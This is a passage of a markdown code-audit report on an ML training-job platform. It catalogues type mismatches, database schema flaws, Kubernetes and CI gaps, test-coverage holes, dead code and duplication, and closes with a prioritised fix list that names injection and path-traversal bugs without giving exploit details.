| I4 | **`ConfigResponse` mismatch** — BE sends `docling_enabled` (FE type missing it); BE sends `mlflow_gateway_uri: ""` (FE expects `string \| null`) | Both sides | |
| I5 | **`HealthResponse` phantom `version?` field** | `types/api.ts:106` | Never sent |
| I6 | **`RecipeSummary.config` always empty** — model has field, `list_recipes()` doesn't return it | | `core/recipes.py:96-102` |
| I7 | **`JobRequest.type` is `string` not `JobType`** — loses type narrowing | `types/api.ts:38` | |
| I8 | **`PaginatedResponse<T>` defined but never used** — dead type | `types/api.ts:307-312` | |

### Shared Constants Not Shared

| # | Issue |
|---|-------|
| I9 | `JobType` and `JobStatus` defined independently as Python `StrEnum` and TypeScript string unions. Must be manually synced. |
| I10 | Polling intervals (3s, 5s, 30s), page sizes, status sets (`ACTIVE_STATUSES`) duplicated between FE and BE with no single source of truth. |
| I11 | OpenAPI spec exists at `openapi/v1.json` but frontend doesn't use it. No type generation from spec. Now that they're in one repo, codegen from OpenAPI would eliminate all type mismatches. |

### Missing Real-time Communication

| # | Issue |
|---|-------|
| I12 | Frontend polls every 3-5s per active job. With N active jobs, that's N+1 requests per interval. SSE/WebSocket for job status events would eliminate this. The backend already has an unused events ingest path (`AMORTIZED_EVENTS_URL` in SSH backend). |

---

## 6. Data Model & Schema

### Schema Issues

| # | Issue | Location |
|---|-------|----------|
| D1 | **Missing indexes** — no index on `parent_job_id`, `mlflow_run_id`, `k8s_job_name`, or composite `(status, created_at)` for `pick_pending_job`. All require full table scans. | `schema.sql` |
| D2 | **No CHECK constraints on `type` or `status`** — any string accepted in DB. Only enforced in Python. | `schema.sql:4-5` |
| D3 | **No FOREIGN KEY on `parent_job_id`** — self-referential FK never declared. `PRAGMA foreign_keys = ON` never set. | `schema.sql:14`, `connection.py:39` |
| D4 | **Inconsistent NULL representation** — `DEFAULT ''` instead of `DEFAULT NULL` on 10+ columns. Repository patches `""` → `None` for exactly 3 fields; rest remain as empty strings, conflating "not set" with "empty". | `schema.sql:9-19`, `repository.py:158-163` |
| D5 | **No `updated_at` audit field** on either table. No soft delete. No `created_by` on documents. | |
| D6 | **`documents` table is dead schema** — document API talks to MLflow directly, never using SQLite table. Repository CRUD methods never called. | `schema.sql:27-34`, `repository.py:130-152` |

### Repository Issues

| # | Issue | Location |
|---|-------|----------|
| D7 | **`cancel_job` read-then-act race** — reads status, checks, cancels via backend, updates DB. Between read and update, worker could change status. | `core/jobs.py:70-96` |
| D8 | **No SQL error translation** — raw `sqlite3` exceptions propagate as unhandled 500s. | `repository.py` |
| D9 | **`assert` used for control flow** — `assert result is not None`. Stripped by `python -O`, becomes silent `None` return. | `repository.py:43`, `core/jobs.py:95` |
| D10 | **`SELECT *` everywhere** — pulls full `config` JSON blob and `backend_handle` even when only metadata needed. | `repository.py:47,59,121,139` |
| D11 | **Redundant re-reads** — INSERT then immediately SELECT same row; UPDATE then SELECT. | `repository.py:42-43,117` |
| D12 | **Commit after every write** — no multi-step atomic operations possible. Crash between two related updates = inconsistent state. | `repository.py:41,116` |

### Recipe Data Issues

| # | Issue | Location |
|---|-------|----------|
| D13 | **`flatten_recipe_to_config` drops falsy values** — empty strings, empty lists, empty dicts, None all silently dropped. Setting `lora_target_modules: []` to clear parent defaults doesn't work. | `recipes.py:128-137` |
| D14 | **`flatten_recipe_to_config` promotes typos** — any non-meta key in recipe YAML becomes part of config. `desription` silently passes through. | `recipes.py:128-137` |
| D15 | **No recipe schema validation** — loaded as raw dicts, no schema check. Typos in field names load successfully. Validation only at job creation, which uses `extra="allow"`. | |
| D16 | **`teacher_model` → `model` silent rename** — if both exist, `teacher_model` left as extra key. | `recipes.py:135-136` |

### Artifact Flow

| # | Issue | Location |
|---|-------|----------|
| D17 | **No artifact cleanup on cancellation** — MLflow runs become orphans, S3 artifacts persist, K8s resources only cleaned up if ownerReferences were set successfully. | `core/jobs.py:70-96` |
| D18 | **K8s orphan resource leak** — if ownerReference patching fails, ConfigMaps and Secrets accumulate indefinitely. Exception swallowed with warning. | `kubernetes.py:410-413` |
| D19 | **`_secrets` key structure leaks in API responses** — values are redacted but `{"_secrets": {"api_key": "***redacted***"}}` structure is visible, revealing which secret types were used. | `core/jobs.py:41`, `core/redact.py` |
| D20 | **Secret cleanup is best-effort** — if cleanup fails, API keys remain on SSH hosts or in K8s. No retry, no audit trail. | `worker.py:586-590` |

---

## 7. Infrastructure & DevOps

### K8s

| # | Issue | Location |
|---|-------|----------|
| K1 | **Missing resource limits/requests** on server, studio, minio, mlflow containers. Only claude-code and opencode have specs. | `server-deployment.yaml:27`, `studio-deployment.yaml:24`, `minio.yaml:26`, `mlflow.yaml:26` |
| K2 | **All images use `:latest` tag** — 7+ deployments including third-party (minio, mlflow, docling, opencode). Non-reproducible, vulnerable to tag mutation. | All deployment YAMLs |
| K3 | **All user overlays disable `runAsNonRoot`** | `k8s/overlays/users/*/kustomization.yaml` |
| K4 | **Missing startup probes** — slow containers (MLflow, docling) vulnerable to premature kills. | All deployments |
| K5 | **No PodDisruptionBudgets** | |
| K6 | **Hardcoded DNS resolver** — `10.96.0.10` breaks if cluster uses different service CIDR. | `studio-deployment.yaml:45-46` |
| K7 | **`amortized-s3` secret referenced but never defined** in base kustomization. If missing, pod fails to start. | `server-deployment.yaml:37` |
| K8 | **Single-replica everything, Recreate strategy** — zero availability during rollouts. | All deployments |
| K9 | **No `readOnlyRootFilesystem`** on any container. | |

### Dockerfiles

| # | Issue | Location |
|---|-------|----------|
| K10 | **Runtime monkey-patching in training Dockerfile** — source code patches to installed packages via `python3.11 -c` string replacement. Silently breaks if upstream changes. | `containers/training/Dockerfile:55-70` |
| K11 | **Runtime stage includes `gcc g++`** — build tools not needed at runtime. Increases image size and attack surface. | `containers/training/Dockerfile:80` |
| K12 | **Unpinned uv image** — `COPY --from=ghcr.io/astral-sh/uv:latest`. | Root `Dockerfile:2`, `agent/Dockerfile:2` |
| K13 | **No `.dockerignore` for studio directory** — `node_modules/` etc. could be sent to build context. | `studio/` |

### CI/CD

| # | Issue | Location |
|---|-------|----------|
| K14 | **No security scanning** — no container image scanning, no SAST, no dependency vulnerability scanning. | `.github/workflows/` |
| K15 | **No deployment pipeline** — images built automatically but deployment requires manual `make` commands. | |
| K16 | **Python version mismatch** — CI uses 3.11, production uses 3.12. | `.github/workflows/ci.yml:19` vs `Dockerfile:1` |
| K17 | **No test coverage reporting** — no `--cov`, no thresholds. | |
| K18 | **No `ruff format --check`** — only lint, not formatting. | |
| K19 | **`uv.lock` gitignored** — non-reproducible installs across developers. | `.gitignore:26` |

### Config Management

| # | Issue | Location |
|---|-------|----------|
| K20 | **No `.env.example`** — 15+ config variables documented nowhere. Developers must read source. | |
| K21 | **`express` and `cors` in frontend production deps** — server-side packages never imported in SPA source. | `studio/package.json` |
| K22 | **Loose Python dependency pins** — all `>=` with no upper bounds. Combined with gitignored lockfile = non-reproducible builds. | `pyproject.toml` |
| K23 | **Pre-commit hook setup not automated** — `git config core.hooksPath .githooks` must be done manually. | |

---

## 8. Testing

### Coverage Summary

| Area | Tests | Coverage | Key Gap |
|------|-------|----------|---------|
| Backend | 148 passing | 43% (1,753/3,100 statements missed) | `_run_job` (280 lines, 0%), `kubernetes.py` (503 lines, 0%) |
| Frontend | 145 passing, 6 failing | Not measured | All stores (0%), all API hooks (0%), all utils (0%) |

### Backend: 0% Coverage Modules

| Module | Lines | Risk |
|--------|-------|------|
| `backends/kubernetes.py` | 503 | Production backend. `_build_pod_spec` (180 lines), submission, status, cancel, logs all untested. |
| `core/judge_templates.py` | 47 | Path traversal vulnerability in `load_judge_template`. |

### Backend: Critically Low Coverage

| Module | Coverage | Key Untested Logic |
|--------|----------|-------------------|
| `api/documents.py` | 15% | SSRF protection `_validate_url`, filename sanitization, all 4 endpoints |
| `backends/ssh.py` | 17% | `submit` (140 lines), `status`, `cancel`, `logs` |
| `worker.py` | 21% | `_run_job` (280 lines) — parent artifact resolution, config translation, spec construction, status polling, MLflow run ID extraction |
| `core/config_translator.py` | 26% | `_trl_config_yaml` field mapping |
| `backends/local.py` | 27% | `submit`, `status`, `cancel`, `logs` |
| `api/artifacts.py` | 29% | S3 proxy |
| `api/costs.py` | 43% | All 5 cost endpoints, division-by-zero risk |

### 12 Completely Untested API Endpoints

`POST /costs/sdg`, `/costs/sdg/compare`, `/costs/training`, `/costs/training/method`, `/costs/eval`, `POST /documents/convert`, `POST /documents/convert/url` (SSRF protection!), `GET /documents`, `GET /documents/{id}/content`, `GET /artifacts/{exp}/{run}/{path}`, `GET /jobs/{id}/artifacts`, `PUT /recipes/{name}`

### Security-Critical Untested Paths

1. SSRF protection (`documents.py:_validate_url:57-73`)
2. Path traversal in judge templates (`judge_templates.py:30`)
3. Path traversal in filename sanitization (`documents.py:49-54`)
4. API key auth middleware (`main.py:146-167`)
5. Recipe save path traversal checks (`recipes.py:52-79`)

### Frontend: Major Untested Areas

- **All 4 Zustand stores** (0% coverage) — `chat-store.ts` (19 actions, persistence, session management), `settings-store.ts` (migration logic), `ui-store.ts`, `entity-names-store.ts`
- **All TanStack Query hooks** (0%) — 25+ hooks including optimistic updates and rollback logic
- **All utility functions** — `workflow-options.ts` (state machine logic), `auto-cost.ts` (7+ code paths), `derive-plan-steps.ts`, `context-summarizer.ts`, `formatDate`, `formatDuration` (3 different implementations)
- **6 failing tests** in `chat-components.test.tsx` — missing `QueryClientProvider` wrapper

### Test Quality Issues

- **CLI tests mock too aggressively** — `_FakeClient` ignores all request bodies. Tests pass with malformed requests. (`test_cli.py:36-53`)
- **Assertions that pass when code is broken** — `assert response.status_code != 404` passes for 500s. (`test_mcp.py:16`)
- **Fixture duplication** — `_use_temp_db` copy-pasted across 3 test files.
- **Frontend CSS class assertions** — break on styling refactors, don't indicate behavioral regression.
- **No loading state tests** — all mocks return `isLoading: false`.
- **No accessibility tests** — no ARIA checks, focus management, keyboard navigation tests.
- **MSW handlers defined but never imported** — comprehensive mock handlers exist but unused.

### Missing Test Categories

Integration tests, contract tests, property-based tests, concurrency tests, fuzz/boundary tests, load tests, accessibility tests, visual regression tests — all completely absent.

---

## 9. Duplication & Dead Code

### Dead Backend Code

| # | Item | Location |
|---|------|----------|
| X1 | **`_get_training_job_for_serve()`** — leftover from removed serve support (AD-11) | `worker.py:250` |
| X2 | **`_trl_config_yaml()` and `_TRL_FIELD_MAP`** — fully implemented, never imported or called | `config_translator.py:40-94` |
| X3 | **`unregister_backend()`** — never called outside tests | `core/compute.py:50` |
| X4 | **Repository document methods** — `list_documents()`, `get_document()`, `create_document()` never called. Documents API talks to MLflow directly. | `db/repository.py:130-152` |
| X5 | **`_detect_container_runtime()`** — defined but never called | `cli/main.py:132` |
| X6 | **Capability system** — `Capability` enum, `MissingCapabilityError`, `check_capabilities` all exist but worker never checks them. `MULTI_NODE` and `RESUME` capabilities declared by no backend. | `backends/__init__.py:11-16`, `core/compute.py:10-15,29-33` |
| X7 | **`events_url` constructed but endpoint doesn't exist** — SSH backend sets `AMORTIZED_EVENTS_URL` to `/api/v1/events/ingest` which doesn't exist. | `backends/ssh.py:75-96` |

### Dead CLI Commands (Call Non-Existent Endpoints)

| Command | Calls | Actual |
|---------|-------|--------|
| `amortized logs` | `/api/v1/jobs/{id}/events` | `/api/v1/jobs/{id}/logs` |
| `amortized types` | `/api/v1/job-types` | Does not exist |
| `amortized artifacts` | `GET /api/v1/artifacts` | Only per-artifact endpoint exists |
| `amortized upload` | `POST /api/v1/artifacts/upload` | Does not exist |
| `amortized backends` | `GET /api/v1/compute` | Does not exist |

### Dead Frontend Code

| # | Item | Location |
|---|------|----------|
| X8 | **9 unused UI components** — avatar, checkbox, combobox, drawer, field, popover, progress, radio-group, spinner | `studio/src/components/ui/` |
| X9 | **Unused hooks** — `use-mobile.ts`, `maskApiKey`, `getCurrentWorkflowPhase`, `workflowStepToCostStep`, `derivePlanSteps` | Various |
| X10 | **Unused types** — `ChatRequest`, `ChatResponse`, `SSEEvent`, `PaginatedResponse`, `ComputeSpec`, `StatusVariant` | `types/api.ts` |
| X11 | **Unused components** — `ChatToggleButton` + `ChatPanel` (only in tests), `features/index.ts` barrel (never imported) | |
| X12 | **Unused deps in `package.json`** — `express`, `cors`, `react-dropzone`, `vaul`, `@base-ui/react` | `studio/package.json` |
| X13 | **`setActiveConversation`, `resetOpenCodeSession`** — exported from api-client, never called | `api-client.ts:206-218` |

### Backend Duplication

| # | Items | Location |
|---|-------|----------|
| X14 | **Sensitive key sets defined 3 times** — `redact.py:8` has `"secret"`, `jobs.py:48` doesn't, `worker.py:434` omits `"password"`. Inconsistent. | 3 files |
| X15 | **Gateway model fetching implemented twice** — `costs.py:188-220` (no cache, different parsing) vs `models.py:25-76` (60s cache, different return type). Same MLflow endpoint. | 2 files |
| X16 | **MLflow httpx client created 13+ times** — every call creates new `AsyncClient` with varying timeouts (5s, 10s, 15s, 30s, 120s). | `worker.py`, `models.py`, `costs.py`, `documents.py` |
| X17 | **`convert_document` and `convert_document_url` near-identical** — ~30 lines of MLflow storage, warning collection, result construction duplicated. | `documents.py:232-304,313-382` |
| X18 | **Fragile parent-traversal path computation duplicated** — `Path(__file__).resolve().parent.parent.parent.parent` in two files. | `recipes.py:16`, `judge_templates.py:13` |
| X19 | **Log retrieval pattern duplicated** — same stdout/stderr reading pattern in local and SSH backends. | `local.py:131-143`, `ssh.py:290-310` |
| X20 | **`"/generated_data/generated_data.jsonl"` hardcoded 3 times** — must update all three if asynth output path changes. | `worker.py:341,365-366,503` |
| X21 | **Hardcoded developer paths in config template** — `/workspace/home/lab/esivaram/...` and `/mnt/nvme3n1/esivaram/...`. | `agents/training/skills/knowledge-ingestion/osft/training-config-template.json` |
| X22 | **Training skill guide references wrong recipe name** — `templates/training/models/qwen2.5-1.5b-lora` but actual file is `qwen-1.5b-lora.yaml`. | `agents/training/skills/` |

### Frontend Duplication

| # | Items | Location |
|---|-------|----------|
| X23 | **`formatDuration` defined 3 times** — different signatures, same purpose. `model-detail.tsx:44` shadows the exported `models/lib/format.ts`. | 3 files |
| X24 | **40+ hardcoded hex colors duplicated across 15+ files** — same palette copy-pasted. Any theme change requires updating every occurrence. | Throughout |
| X25 | **Navigation arrays duplicated** — `layout.tsx:46-55` and `command-palette.tsx:22-31` define same nav items independently. | 2 files |
| X26 | **Polling intervals scattered as undocumented magic numbers** — 3000, 5000, 30000 across 6+ files. | Various |

---

## 10. Priority Summary

### Fix Now (Security / Data Loss / RCE)

1. **S1** Shell injection in K8s init containers — use `shlex.quote()` or pass args as list
2. **S2** SSH heredoc injection — use randomized delimiter or sftp
3. **S3** SSH host key verification disabled
4. **S4** Auth disabled by default + MCP auth catch-22
5. **S5** Hardcoded credentials in git
6. **A11** 4 SDG templates use `conversation` instead of `messages` — silently breaks training
7. **A16** 7 eval templates get empty prompts (Schema B not handled)
8. **S12** Secrets in plaintext in SQLite

### Fix Soon (Architecture / Correctness)

9. **B1** Single-threaded worker (head-of-line blocking)
10. **B2** Non-atomic job pickup (TOCTOU race)
11. **B3** `provisioning` dead zone (no recovery)
12. **B24** MLflow failure = silent data loss in job chaining
13. **B16** MLflow run ID extraction via log regex (sole artifact linkage mechanism)
14. **F13** `activeConversationId` race condition
15. **F16** No request timeout/abort signal (permanent streaming state)
16. **A1** Stale deployed prompt (missing phase tags)
17. **D1** Missing database indexes
18. **B7** No migration system

### Fix for Production (Operational Maturity)

19. All observability (no metrics, no structured logging, no tracing, shallow health checks)
20. **K8** Single-replica, Recreate strategy (zero availability during rollouts)
21. **I3/D6** Server-side pagination
22. **S23** Multi-tenancy and user isolation
23. **I11** Type generation from OpenAPI spec
24. **K14** Security scanning in CI
25. **I12** SSE/WebSocket for job status (replace polling)
26. **K1** Resource limits on all containers
27. **K2** Pin all image tags

### Clean Up (Quality / Dead Code)

28. **I1-I8** All type mismatches between frontend and backend
29. **X1-X13** All dead code (both sides)
30. **X14-X26** All duplication
31. **F1-F14** Frontend bugs
32. **F15-F21** Frontend performance
33. **F28-F34** Accessibility
34. **B40-B47** Missing validation
35. Test coverage gaps (43% backend, unmeasured frontend)
